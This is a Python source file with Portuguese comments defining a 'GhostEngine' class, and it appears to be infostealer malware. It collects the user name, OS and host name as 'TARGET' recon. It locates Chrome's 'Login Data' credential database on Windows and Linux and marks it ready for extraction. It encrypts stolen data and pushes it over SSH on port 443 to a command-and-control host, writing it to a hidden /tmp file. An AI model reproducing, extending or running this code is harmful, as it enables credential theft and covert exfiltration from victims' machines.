import paramiko
from cryptography.fernet import Fernet
import os
import platform
import socket

class GhostEngine:
    def __init__(self, key_path="nexus_prime.key"):
        # Verifica se a chave existe para evitar crash do sistema
        if not os.path.exists(key_path):
            # Se não existir, tenta ler de uma variável de ambiente ou cria erro silencioso
            raise FileNotFoundError(f"Chave {key_path} necessária para o motor Ghost.")
        
        with open(key_path, "rb") as f:
            self.key = f.read()
            self.cipher = Fernet(self.key)
            
    def cifrar_dados(self, texto):
        """Criptografia AES-256 para ocultar logs e credenciais."""
        return self.cipher.encrypt(texto.encode())

    def transmitir_via_tunel(self, host_c2, user, pkey_path, payload_cifrado):
        """Protocolo de Transmissão Stealth via Porta 443."""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host_c2, port=443, username=user, key_filename=pkey_path, timeout=10)
            
            # Ejeta o dado para o servidor oculto
            ssh.exec_command(f"echo {payload_cifrado.decode()} >> /tmp/.nexus_ghost")
            ssh.close()
            return True
        except:
            return False

    def scan_local_credentials(self):
        """[PASSO A] Captura informações básicas de identificação do sistema."""
        try:
            info = {
                "user": os.getlogin(),
                "os": platform.system(),
                "node": platform.node(),
                "path": os.getcwd()
            }
            return f"TARGET: {info['user']} | OS: {info['os']} | NODE: {info['node']}"
        except:
            return "Erro ao realizar Recon local."

    def shadow_cookie_scan(self):
        """[PASSO B] Localiza bancos de dados de navegadores (Chrome/Edge)."""
        if platform.system() == "Windows":
            path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        else:
            path = os.path.expanduser("~") + "/.config/google-chrome/Default/Login Data"
        
        if os.path.exists(path):
            return f"SHADOW-COOKIE: Localizado em {path}. Pronto para extração."
        return "SHADOW-COOKIE: Nenhum rastro de navegador identificado no diretório padrão."
